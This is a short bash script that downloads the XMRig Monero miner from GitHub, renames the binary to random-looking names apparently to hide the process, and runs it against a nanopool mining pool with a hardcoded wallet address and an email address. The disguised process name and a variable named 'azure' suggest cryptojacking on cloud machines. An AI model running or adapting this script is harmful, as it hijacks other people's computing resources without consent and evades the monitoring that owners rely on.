#!/bin/bash
sudo apt-get update
VERSION=6.3.1
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=xmr-us-west1.nanopool.org:14433
USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com
ALGO=rx/0
DONATE=1
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.orc -p x -a $ALGO -k --tls
